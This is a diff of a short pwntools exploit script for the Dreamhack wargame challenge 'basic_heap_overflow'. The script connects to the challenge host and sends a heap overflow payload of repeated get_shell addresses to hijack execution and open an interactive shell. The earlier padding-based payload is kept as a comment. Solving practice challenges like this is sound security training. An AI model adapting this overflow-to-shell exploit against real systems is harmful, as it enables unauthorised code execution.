@@ -1,15 +1,21 @@
 from pwn import *
-context.log_level='debug'
+context.log_level = 'debug'
 
-n = remote('host1.dreamhack.games',8397)
+hosts = 'host1.dreamhack.games'
+port = 14854
+
+p = remote(hosts,port)
+
 elf = ELF('./basic_heap_overflow')
-
 get_shell = elf.symbols['get_shell']
 
-payload = b'A'*40
+'''
+payload = b'\x90'*0x30
 payload += p32(get_shell)
+'''
 
-n.send(payload)
-success(payload.hex())
+payload = p32(get_shell)*16
 
-n.interactive()
+p.sendline(payload)
+
+p.interactive()
